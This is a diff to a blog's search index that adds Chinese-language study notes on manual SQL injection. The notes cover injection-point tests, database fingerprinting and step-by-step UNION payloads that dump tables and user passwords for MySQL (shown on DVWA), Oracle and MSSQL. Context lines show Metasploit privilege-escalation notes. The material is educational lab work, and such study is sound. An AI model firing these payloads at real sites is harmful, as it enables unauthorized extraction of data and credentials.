@@ -1,6 +1,247 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQL注入</title>
+    <url>/%E5%AD%A6%E4%B9%A0/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%AF%87.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一-分类"><a href="#一-分类" class="headerlink" title="一.分类"></a>一.分类</h2><h3 id="1-基于变量数据类型分类"><a href="#1-基于变量数据类型分类" class="headerlink" title="1.基于变量数据类型分类"></a>1.基于变量数据类型分类</h3><ul>
+<li>字符型注入</li>
+<li>数字型注入</li>
+</ul>
+<h3 id="2-基于获取数据的方法分类"><a href="#2-基于获取数据的方法分类" class="headerlink" title="2.基于获取数据的方法分类"></a>2.基于获取数据的方法分类</h3><ul>
+<li>基于回显</li>
+<li>基于错误</li>
+<li>盲注</li>
+</ul>
+<h3 id="3-基于注入点位置"><a href="#3-基于注入点位置" class="headerlink" title="3.基于注入点位置"></a>3.基于注入点位置</h3><ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>Cookie注入</li>
+<li>……</li>
+</ul>
+<h2 id="二-注入流程"><a href="#二-注入流程" class="headerlink" title="二.注入流程"></a>二.注入流程</h2><p><img src="http://imag.k3rwin.cn/image-20201207140012047.png" alt="image-20201207140012047"></p>
+<h3 id="1-注入点分析"><a href="#1-注入点分析" class="headerlink" title="1.注入点分析"></a>1.注入点分析</h3><ul>
+<li>数字型</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?id&#x3D;1</span><br><span class="line"></span><br><span class="line">bool型注入判断</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?id&#x3D;1 and 1&#x3D;1</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?id&#x3D;1 and 1&#x3D;2</span><br><span class="line"></span><br><span class="line">报错注入判断</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?id&#x3D;1&#39;</span><br><span class="line"></span><br><span class="line">时间盲注</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?id&#x3D;1 and sleep(5)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>字符型</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?name&#x3D;admin</span><br><span class="line"></span><br><span class="line">bool型判断</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?name&#x3D;admin&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?name&#x3D;admin&#39; and &#39;1&#39;&#x3D;&#39;2</span><br><span class="line"></span><br><span class="line">报错注入判断</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?name&#x3D;admin&#39;</span><br><span class="line"></span><br><span class="line">时间盲注</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;sql.php?name&#x3D;admin&#39; and sleep(5) --+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>经常需要结合注释符判断<ul>
+<li>–+（–空格）</li>
+<li># (get方式从url中提交需要url编码为%23)</li>
+<li>payload结尾闭合符号(‘ “ ( )等符号)</li>
+<li>内联注释/**/（一般用来bypass空格）</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-数据库判断"><a href="#2-数据库判断" class="headerlink" title="2.数据库判断"></a>2.数据库判断</h3><ul>
+<li><p>基于WEB开发语言(猜测)</p>
+<ul>
+<li>asp,aspx通常与Acess、Sqlserver一起使用</li>
+<li>PHP通常与Mysql、PostgreSQL一起使用</li>
+<li>Jsp通常与Oracle、Mysql一起使用</li>
+</ul>
+</li>
+<li><p>基于报错信息</p>
+</li>
+<li><p>基于端口开放情况</p>
+<ul>
+<li>Oracle 1521</li>
+<li>SQLServer 1433</li>
+<li>Mysql 3306</li>
+<li>Access 数据库属于文件型数据库 所以不需要端口号</li>
+</ul>
+</li>
+<li><p>基于特定函数</p>
+<ul>
+<li>len和length：在mssql、db2内，返回长度值是调用len()函数；在mysql、oracle和INFORMIX则是通过length()来返回长度值。</li>
+<li>@@version和version()：在mysql内，可以用@@version或是version()来返回当前的版本信息。但无法判断是mysql还是mssql时，可以用version()函数来构造判断。</li>
+<li>substring和substr：在mssql中可以调用substring。oracle则只可调用substr</li>
+</ul>
+</li>
+<li><p>基于特殊符号</p>
+<ul>
+<li>“/*”是Mysql中的注释符</li>
+<li>“–”是Oracle和MSSQL支持的注释符，mysql使用是需要加空格”– “或者”–+”</li>
+<li>“;”是字句查询标识符，Oracle不支持多行查询</li>
+</ul>
+<p>在注入点后加（必须为注入点）;–（一个分号，两个横线），例如：<a href="http://test.com?id=1;--" target="_blank" rel="noopener">http://test.com?id=1;--</a> ,如果返回正常的话，说明数据库是MSSQL。在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。</p>
+</li>
+<li><p>基于字符串处理方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sql server ：id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; --</span><br><span class="line">mssql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39;</span><br><span class="line">mysql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; ， &#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">oracle:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">postgresql :id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>基于特殊数据表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access:</span><br><span class="line">    and (select count(*) from MSysAccessObjects)&gt;0 返回正常说明是access</span><br><span class="line">    and exists(select count(*) from 表)</span><br><span class="line">SQLserver:</span><br><span class="line">    and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql，这个表只有MSSQL数据库才有</span><br><span class="line">MySQL:</span><br><span class="line">    and length(user())&gt;0    返回正常说明是MySQL</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="三-漏洞利用目标"><a href="#三-漏洞利用目标" class="headerlink" title="三.漏洞利用目标"></a>三.漏洞利用目标</h2><h3 id="1-操作数据"><a href="#1-操作数据" class="headerlink" title="1.操作数据"></a>1.操作数据</h3><ul>
+<li>主要为读取数据库中敏感数据</li>
+</ul>
+<h3 id="2-读写文件"><a href="#2-读写文件" class="headerlink" title="2.读写文件"></a>2.读写文件</h3><ul>
+<li>拖库</li>
+</ul>
+<h3 id="3-执行命令"><a href="#3-执行命令" class="headerlink" title="3.执行命令"></a>3.执行命令</h3><ul>
+<li>MSSQL中的xp_cmdshell</li>
+</ul>
+<h2 id="四-构造payload"><a href="#四-构造payload" class="headerlink" title="四.构造payload"></a>四.构造payload</h2><h3 id="1-基本手工利用"><a href="#1-基本手工利用" class="headerlink" title="1.基本手工利用"></a>1.基本手工利用</h3><h4 id="1-1-Mysql"><a href="#1-1-Mysql" class="headerlink" title="1.1 Mysql"></a>1.1 Mysql</h4><h5 id="mysql手工注入必备知识"><a href="#mysql手工注入必备知识" class="headerlink" title="mysql手工注入必备知识"></a>mysql手工注入必备知识</h5><ul>
+<li>mysql系统数据库：information_schema-&gt;关键表schemata-&gt;关键字段SCHEMA_NAME  (数据库名)</li>
+<li>mysql系统数据库：information_schema-&gt;关键表tables-&gt;关键字段TABLE_NAME,TABLE_SCHEMA(表名，库名)</li>
+<li>mysql系统数据库：information_schema-&gt;关键表columns-&gt;关键字段TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME(库名，表名，字段名)</li>
+</ul>
+<h5 id="mysql手工注入步骤"><a href="#mysql手工注入步骤" class="headerlink" title="mysql手工注入步骤"></a>mysql手工注入步骤</h5><ol>
+<li><p>判断注入点及注入类型</p>
+<p><code>1&#39; and 1=1#</code></p>
+<p>正常显示，存在字符型注入</p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172643865.png" alt="image-20201207172643865"></p>
+</li>
+<li><p>使用order by判断SQL查询语句字段数</p>
+<p><code>1&#39; order by 2#</code></p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172722414.png" alt="image-20201207172722414"></p>
+</li>
+</ol>
+<p>​    <code>1&#39; order by 3#</code></p>
+<p>​        <img src="http://imag.k3rwin.cn/image-20201207172741998.png" alt="image-20201207172741998"></p>
+<p>​    SQL查询语句中的字段数为2：即First name和Surname</p>
+<ol start="3">
+<li><p>使用union select判断字段顺序</p>
+<p><code>1&#39; union select 1,2#</code></p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172808992.png" alt="image-20201207172808992"></p>
+</li>
+<li><p>获取数据库</p>
+<p><code>1&#39; union select 1,database()#</code></p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172818677.png" alt="image-20201207172818677"></p>
+<p>如果想获取其他数据库需使用schemata表中的schema_name字段,即:</p>
+<p><code>1&#39;union select 1,group_concat(schema_name) from information_schema.schemata#</code></p>
+</li>
+<li><p>获取数据表</p>
+<p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172835439.png" alt="image-20201207172835439"></p>
+<p>或者：</p>
+<p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=‘dvwa&#39;#</code></p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172851891.png" alt="image-20201207172851891"></p>
+</li>
+<li><p>获取数据字段</p>
+<p><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#</code></p>
+<p><img src="http://imag.k3rwin.cn/image-20201207172902233.png" alt="image-20201207172902233"></p>
+</li>
+<li><p>获取数据</p>
+<p><code>1&#39; union select group_concat(user_id,&#39;-&#39;,first_name,&#39;-&#39;,last_name),group_concat(password) from users#)</code></p>
+<p> <img src="http://imag.k3rwin.cn/image-20201207172911604.png" alt="image-20201207172911604"></p>
+</li>
+</ol>
+<h4 id="1-2-Oracle"><a href="#1-2-Oracle" class="headerlink" title="1.2 Oracle"></a>1.2 Oracle</h4><h5 id="Oracle手工注入必备知识"><a href="#Oracle手工注入必备知识" class="headerlink" title="Oracle手工注入必备知识"></a>Oracle手工注入必备知识</h5><ul>
+<li><p>Oracle没有数据库的概念</p>
+</li>
+<li><p>特殊表</p>
+<ul>
+<li><p>dual：虚拟表，用来构成select的语法规则，Oracle保证dual里永远只有一条记录</p>
+<p>oracle查询需要带上表名，万能表dual</p>
+</li>
+<li><p>user_tables：该表的table_name列存放当前数据库中的所有表。查询所有表名：<code>select table_name from user_tables</code></p>
+</li>
+<li><p>user_tab_columns：该表的column_name存放表的所有列。查询某个表的所有列名：<code>select column_name from user_tab_columns where table_name=&#39;xxx&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><p>内置函数，内置语句</p>
+<ul>
+<li>获取数据库版本<code>select banner from sys.v_$version</code></li>
+<li>获取当前用户 <code>select user from dual</code></li>
+<li>获取所有用户名<code>select user from dba_users</code></li>
+</ul>
+<p><img src="http://imag.k3rwin.cn/image-20201207162627498.png" alt="image-20201207162627498"></p>
+<ul>
+<li><p>单行子查询返回多行数据使用 where rownum=1规范</p>
+<p>例如：user表</p>
+<p>id name pwd</p>
+<p>1   a        x</p>
+<p>2   b        xx</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="comment">--返回a</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">form</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">name</span> &lt;&gt; <span class="string">'a'</span>  <span class="comment">--返回b,&lt;&gt;意思为不等于</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>单行输出多行，类似mysql里的group_concat函数</p>
+<p>sys.stragg() 版本在11g+可用，注入时注意||连接符需要url编码</p>
+<p><img src="http://imag.k3rwin.cn/image-20201207163026746.png" alt="image-20201207163026746"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="Oracle手工注入步骤"><a href="#Oracle手工注入步骤" class="headerlink" title="Oracle手工注入步骤"></a>Oracle手工注入步骤</h5><ol>
+<li><p>判断列数</p>
+<p><code>?id=1 order by 2</code></p>
+</li>
+<li><p>判断回显位置</p>
+<p><code>?id=0 union select null,1 from dual</code></p>
+</li>
+<li><p>union子句获取基本的数据</p>
+<p>获取当前用户名</p>
+<p><code>?id=0 union select null,user from dual</code></p>
+<p>系统版本</p>
+<p><code>?id=0 union all select null,banner from sys.v_$version</code></p>
+</li>
+<li><p>获取表名</p>
+<p><code>?id=0 union all select null,sys.stragg(table_name||&#39;&lt;br&gt;&#39;) from user_tables</code></p>
+</li>
+<li><p>获取表中的列名</p>
+<p><code>?id=0 union all select null,sys.stragg(column_name||&#39;&lt;br&gt;&#39;) from user_tab_columns where table_name=&#39;xxx&#39;</code></p>
+</li>
+<li><p>获取列字段(获取列字段，<strong>oracle查询时将小写的表名用双引号引起来</strong>)</p>
+<p><code>?id=0 union all select null,sys.stragg(USER_NAME||&#39;:&#39;||USER_PWD||&#39;&lt;br&gt;&#39;) from &quot;xxx&quot;</code></p>
+</li>
+</ol>
+<h4 id="1-3-SqlServer"><a href="#1-3-SqlServer" class="headerlink" title="1.3 SqlServer"></a>1.3 SqlServer</h4><pre><code>##### MSSQL手工注入必备知识</code></pre><ul>
+<li><p><strong>MSSQL强类型，不同于MYSQL弱类型可以使用hex编码，字符串编码使用sql_en</strong></p>
+</li>
+<li><p>内置函数、</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host_name():返回服务端计算机名称</span><br><span class="line">db_name();返回当前数据库的名称</span><br><span class="line">current_user:返回当前数据库用户名</span><br><span class="line">subString(str,start,length):字符串截取</span><br><span class="line">char(ascii):ascii转字符函数，只有一个参数</span><br><span class="line">@@version:查看数据库版本</span><br><span class="line">ISNULL(NULL,123):判断是否存在NULL，有则替换为后者</span><br><span class="line">CAST(a as type)：字符类型转换，转换失败将显示a</span><br><span class="line">object_id(&#39;name&#39;):根据表名返回表名对应id</span><br><span class="line">object_name(id):根据id返回数据表名</span><br><span class="line">col_name(object_id,column_id):返回指定表中指定字段的名称</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>内置数据库和数据表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内置系统数据库：master</span><br><span class="line">关键数据表：</span><br><span class="line">	sysdatabases：存放所有数据库名和库id（查看所有数据库：select name from master..sysdatabases;）</span><br><span class="line">	sysobjects：每个数据库都有的系统表，存放数据库内所有表;主要字段有：数据表名name，表id，表类型xtype，所有者的用户id，状态status；(查看某个数据库的所有用户表和表id：select name,id from 数据库..sysobjects where xtype&#x3D;&#39;U&#39; and status&gt;0)</span><br><span class="line">	syscolumns：每个数据库都有，存放数据库内所有列，主要字段有：字段名称name,表ID号id,字段ID号colid；（查看某张表中的所有列：select name from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;&#39;表名&#39;)）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>单行回显输出多行数据</p>
+<ul>
+<li>构造数据类型转换报错（逐行查询使用top嵌套）</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and 1=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">0</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases))<span class="comment">--第0+1行查询数据(也可以不用后面的where条件，在使用bp配合利用的时候更方便)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases))<span class="comment">--第1+1行查询数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">2</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases))<span class="comment">--第2+1行查询数据</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h5 id="MSSQL手工注入步骤"><a href="#MSSQL手工注入步骤" class="headerlink" title="MSSQL手工注入步骤"></a>MSSQL手工注入步骤</h5><ol>
+<li><p>判断列数</p>
+<p><code>id=1 order by 2 --</code></p>
+</li>
+<li><p>判断数据回显位置（unnion select 会去除重复项，使用null避免参数类型冲突）</p>
+<p><code>?id=0 union all select null,null--</code></p>
+</li>
+<li><p>union字句获取数据库名</p>
+<p>使用union select 可能出现前后两个查询编码方式不同报错，使用编码转换union select语句，参数 collate 编码方式</p>
+<p><code>?id=0 union all select null,(select (name collate 编码方式) from master..sysdatabases)--</code></p>
+</li>
+<li><p>获取数据表名</p>
+<p><code>?id=0 union all select null,(select (name collate 编码方式) from dbname..sysobjects where xtype=&#39;U&#39;)--</code></p>
+</li>
+<li><p>获取列名</p>
+<p><code>?id=0 union all select null,(select (name collate 编码方式) from dbname..syscolumns where id=(select id from dbname..sysobjects where name=&#39;xxx&#39;))--</code></p>
+</li>
+<li><p>获取列字段</p>
+<p><code>?id=0 union all select null,(select (x1 collate 编码方式)+&#39;.&#39;+(x2 collate 编码方式) from dbname..tablename)</code></p>
+</li>
+</ol>
+<h3 id="2-bypass"><a href="#2-bypass" class="headerlink" title="2.bypass"></a>2.bypass</h3>]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>护网</title>
     <url>/%E5%B7%A5%E4%BD%9C/%E6%8A%A4%E7%BD%91.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="护网流程-保障前"><a href="#护网流程-保障前" class="headerlink" title="护网流程-保障前"></a>护网流程-保障前</h1><h2 id="一-前期工作准备阶段"><a href="#一-前期工作准备阶段" class="headerlink" title="一.前期工作准备阶段"></a>一.前期工作准备阶段</h2><h3 id="1-建立护网组织"><a href="#1-建立护网组织" class="headerlink" title="1.建立护网组织"></a>1.建立护网组织</h3><p><strong>作为主导方时必须做的工作</strong></p>
@@ -841,7 +1082,7 @@
 <h2 id="二-进程迁移"><a href="#二-进程迁移" class="headerlink" title="二.进程迁移"></a>二.进程迁移</h2><h3 id="1-手动迁移"><a href="#1-手动迁移" class="headerlink" title="1.手动迁移"></a>1.手动迁移</h3><h4 id="获取当前进程信息-ps"><a href="#获取当前进程信息-ps" class="headerlink" title="获取当前进程信息:ps"></a>获取当前进程信息:<code>ps</code></h4><h4 id="进程迁移-migrate-lt-稳定的进程号pid-gt"><a href="#进程迁移-migrate-lt-稳定的进程号pid-gt" class="headerlink" title="进程迁移:migrate &lt;稳定的进程号pid&gt;"></a>进程迁移:<code>migrate &lt;稳定的进程号pid&gt;</code></h4><p><img src="http://imag.k3rwin.cn//migrate.png" alt="migrate"></p>
 <h3 id="2-使用后渗透模块post-windows-manage-migrate自动迁移"><a href="#2-使用后渗透模块post-windows-manage-migrate自动迁移" class="headerlink" title="2.使用后渗透模块post/windows/manage/migrate自动迁移"></a>2.使用后渗透模块post/windows/manage/migrate自动迁移</h3><p><code>run post/windows/manage/migrate</code></p>
 <p><img src="http://imag.k3rwin.cn//migrate2.png" alt="migrate2"></p>
-<h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>查看当前权限<code>getuid</code><br>若未系统权限则绕过此步</p>
+<h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>查看当前权限<code>getuid</code><br>若为系统权限则绕过此步</p>
 <h3 id="1-getsystem"><a href="#1-getsystem" class="headerlink" title="1.getsystem"></a>1.getsystem</h3><p><img src="http://imag.k3rwin.cn//getsystem.png" alt="getsystem"></p>
 <p>默认选项 0 使用三种技术进行提权<br>                                    <img src="http://imag.k3rwin.cn//get.png" alt="get"></p>
 <h3 id="2-绕过UAC"><a href="#2-绕过UAC" class="headerlink" title="2.绕过UAC"></a>2.绕过UAC</h3><ul>
